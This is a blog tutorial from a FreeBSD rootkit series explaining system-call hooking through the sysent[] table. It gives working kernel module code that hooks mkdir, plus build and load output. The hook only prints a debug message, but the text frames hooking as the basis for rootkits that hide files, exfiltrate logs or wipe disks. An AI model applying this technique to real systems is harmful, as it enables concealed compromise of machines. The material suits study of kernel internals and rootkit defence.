---
title        : "FreeBSD Rootkit Design Howtos - 8 - System Call Hook and mkdir_hook Example"
date         : "2011-04-25"
tags         : [FreeBSD, Rootkit, C++]
---

We should all agree with the simplicity of the first chapter at this point,
there are only few new APIs and concepts, all we did was following the book, the
manual pages, or the examples. So if I tell you that we can write real rootkits
starting from this chapter, you’d probably not believe me, but that is true. All
we need is a little push to the by far most common, most famous, and most
popular rootkit technique – the ***Hooking***, since we already have all basic
knowledge required for this.

## Hooking

As I said, the Hooking technique might be one of the oldest and most widely
spread rootkit techniques. The concept of hook is easy, we program and install a
kernel module, and let that module pretends to be another system module to
change the routine of an execution of a command.

It is rather a simple but efficient technique, all we have to do is to change
the routine of an system execution, so that we can change the execution results,
add functionalities, and also deduct functionalities if we want. So if you
intend to write rootkits, then Hooking is for sure the simplest and most
efficient technique to use. For example, we can hide file contents, hide
directory, hide network connections by hooking those function calls and change
the way how they display the results.

![List Dir Hook](/assets/images/freebsd-rootkit-design-howtos/hook.png)

The above figure shows the process of how to hijack a ***list directory call*** and
hide file(s) from displaying. The original process should be triggered by a ls
command, where the testDirectory is the parameter here. The the ***list directory
call*** will use the parameter to read the list of items under that directory and
eventually display all of them one by one.

To hijack the execution process the system call, register itself as the new ***list
directory call***, read the list of items under that directory and check Is the
Item Hidden (by filename, or by contents, you decide the checking mechanism),
and then display those are not hidden by calling the ***original system call***, and
everything will be working normally by the end except that we have hiden our
secret files.

So you can see that the power of Hooking is only limited by your imagination.
You can hide files, hide network connections, temper user list results, have the
infected host uploading all it's logs when it initializes a HTTP request,
or delete the entire filesystem on your birthday to have some malicous fun.

Once we get to know how to program a Hooking, we can start writing our first
rootkit. That is what I’m gonna do in this chapter, unlike the first chapter, we
are not going to learn a lot of APIs, instead, we’ll see lots of examples(from
the book, or by myself) to show the real power of Hooking.

Okay, enough talk, lets start with a ***mkdir_hook*** example.

## The mkdir_hook Example

### Manipulate sysent[] Table

As we have discussed previously, `sysent[]` is a table holding every registered
system call’s sysent structure. The hooking technique is based on tempering the
`sysent[]` table, so let’s review this a little bit.

``` c++
FILE:/usr/src/sys/sys/sysent.h

struct sysent {                 /* system call table */
        int     sy_narg;        /* number of arguments */
        sy_call_t *sy_call;     /* implementing function */
        au_event_t sy_auevent;  /* audit event associated with syscall */
        systrace_args_func_t sy_systrace_args_func;
                                /* optional argument conversion function. */
        u_int32_t sy_entry;     /* DTrace entry ID for systrace. */
        u_int32_t sy_return;    /* DTrace return ID for systrace. */
        u_int32_t sy_flags;     /* General flags for system calls. */
        u_int32_t sy_thrcnt;
};

...

extern struct sysent sysent[];
```

The process is we create sysent structure for our system calls, put basic
information like number of arguments and implementation functions in it, and
register our system call with `sysent[]` table. See example code below.

``` c++
...
...

/* The system call's arguments. */
struct sc_example_args {
    char *str;
};

/* The system call function. */
static int sc_example(struct thread *td, void *syscall_args)
{
    struct sc_example_args *uap;
    uap = (struct sc_example_args *)syscall_args;
...
...
}

/* The sysent for the new system call */
static struct sysent sc_example_sysent = {
    1,  /* number of arguments */
    sc_example  /* implementing function */
};

...
...

SYSCALL_MODULE(sc_example, &offset, &sc_example_sysent, load, NULL);
```

In the example above, we created `sc_example_sysent` sysent structure, and
specified the number of arguments and implementation function pointer to that
structure, and use it as a parameter for `SYSCALL_MODULE` declaration macro.


So if we want to change the execution routine of `mkdir`, and register our own
module as mkdir in `sysent[]` table, all we have to to is to get the ***sysent
offset*** of mkdir, and change the `sy_call` to our own implementation function
pointer. Sample code should look like this:

``` c++
...
/* The system call's arguments. */
struct mkdir_hook_args {
    ...

};

/* mkdir system call hook */
static int mkdir_hook(struct thread *td, void *syscall_args)
{
    ...
}

/* The sysent for the new system call */
static struct sysent mkdir_hook_sysent = {
    ...
    mkdir_hook  /* implementing function */
};

sysent[MKDIR_OFFSET].sy_call = (sy_call_t *)mkdir_hook;
```

And to undo the changing to sysent[] table, we just need to

``` c++
sysent[MKDIR_OFFSET].sy_call = (sy_call_t *)mkdir;
```

For general system calls, such as mkdir, we can get a list of constant offsets
of them in sys/syscall.h

``` c++
FILE:/usr/src/sys/sys/syscall.h

...
#define SYS_rename      128
                                /* 129 is old truncate */
                                /* 130 is old ftruncate */
#define SYS_flock       131
#define SYS_mkfifo      132
#define SYS_sendto      133
#define SYS_shutdown    134
#define SYS_socketpair  135
#define SYS_mkdir       136
#define SYS_rmdir       137
#define SYS_utimes      138
                                /* 139 is obsolete 4.2 sigreturn */
...
...
```

Be sure to take a look at that list, there are so many fun system calls we can abuse. :-p

## The Implementation

The example code from the book won't complie, here's my revised version.

``` c++
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h> //New
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

/* The system call's arguments. */
struct mkdir_hook_args {
    char *path;
    int mode;
};

/* mkdir system call hook */
static int mkdir_hook(struct thread *td, void *syscall_args)
{
    struct mkdir_hook_args *uap;
    uap = (struct mkdir_hook_args *)syscall_args;

    char path[255];
    size_t done;
    int error;

    error = copyinstr(uap->path, path, 255, &done);
    if (error!=0)
        return(error);

    /* print a debug message */
    uprintf("The directory "%s" will be created with the following permissions: %on", path, uap->mode);

    return (mkdir(td, syscall_args));
}

/* The sysent for the new system call */
static struct sysent mkdir_hook_sysent = {
    2,          /* number of arguments */
    mkdir_hook  /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg)
{
    int error=0;

    switch(cmd) {
        case MOD_LOAD:
            /* Replace mkdir with mkdir_hook. */
            sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
            uprintf("The mkdir_hook is loaded, you can try to mkdir now.n");
            break;

        case MOD_UNLOAD:
            /* Change everything back to normal. */
            sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;
            uprintf("The mkdir_hook is unloaded, everything is back to normal now.n");
            break;

        default:
            error = EOPNOTSUPP;
            break;
    }

    return(error);
}

SYSCALL_MODULE(mkdir_hook, &offset, &mkdir_hook_sysent, load, NULL);
```

This is nothing just a normal system call, we have `mkdir_hook_args` to receive
arguments, we have `mkdir_hook` as implementation function, `mkdir_hook_sysent`
as sysent structure, `load` as event handler and finally use `SYSCALL_MODULE` to
declare the system call.

What this system call does is to change `sysent[]` table, set `mkdir_hook` as
the implementation function of `SYS_mkdir` when this module loads, and set it
back to normal when it unloads (Otherwise mkdir call will not work once our
module is unloaded from the kernel). And we receive arguments of the `path` and
`mode` of the directory to be created from user space, copy path to kernel space
using `copyinstr()`, display a simple debug message, and then pass the `thread
td` and system arguments(contains `path` and `mode`) syscall_args to a normal
mkdir call to complete the request.

### The Load and Call

Save this make file in the same directory as the source.

``` c++
KMOD=   mkdir_hook
SRCS=   mkdir_hook.c

.include <bsd.kmod.mk>

```

``` shell
ZFSTest# make clean
rm -f export_syms mkdir_hook.ko mkdir_hook.kld mkdir_hook.o
ZFSTest# make
Warning: Object directory not changed from original /zroot/development/4.Hooks
cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mcmodel=kernel -mno-red-zone  -mfpmath=387 -mno-sse -mno-sse2 -mno-sse3 -mno-mmx -mno-3dnow  -msoft-float -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions -c mkdir_hook.c
ld  -d -warn-common -r -d -o mkdir_hook.ko mkdir_hook.o
:> export_syms
awk -f /sys/conf/kmod_syms.awk mkdir_hook.ko  export_syms | xargs -J% objcopy % mkdir_hook.ko
objcopy --strip-debug mkdir_hook.ko
```

``` shell
ZFSTest# kldload ./mkdir_hook.ko
The mkdir_hook is loaded, you can try to mkdir now.

ZFSTest# mkdir test
The directory "test" will be created with the following permissions: 777

ZFSTest# kldunload mkdir_hook.ko
The mkdir_hook is unloaded, everything is back to normal now.

ZFSTest# mkdir test
ZFSTest#
```

As you can see, once we register our module with the kernel, a debug message
displays every time the user tries to create a new directory. This may not be
exiciting, but serves it's purpose as a POC. You can edit the code and have it
only create the folder when the supplied name starts with 'awesome' if you are
keen for some hands-on practice.

This is the end of today's session, We will get to know the general process to
writing a semi-working Rootkit on next note, stay tuned!
